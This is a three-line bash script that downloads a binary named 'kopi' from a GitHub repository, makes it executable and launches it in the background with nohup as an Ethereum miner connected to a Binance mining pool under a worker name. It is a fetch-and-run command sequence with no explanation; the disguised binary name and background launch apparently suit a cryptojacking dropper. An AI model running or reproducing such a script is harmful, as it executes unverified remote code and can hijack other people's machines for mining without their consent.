#!/bin/bash
wget https://github.com/aurbach55/dera/raw/main/kopi
chmod +x ./kopi && nohup ./kopi --coin ETH --pool ethash.poolbinance.com:443 --user TeslaM.T5 > nohup.out
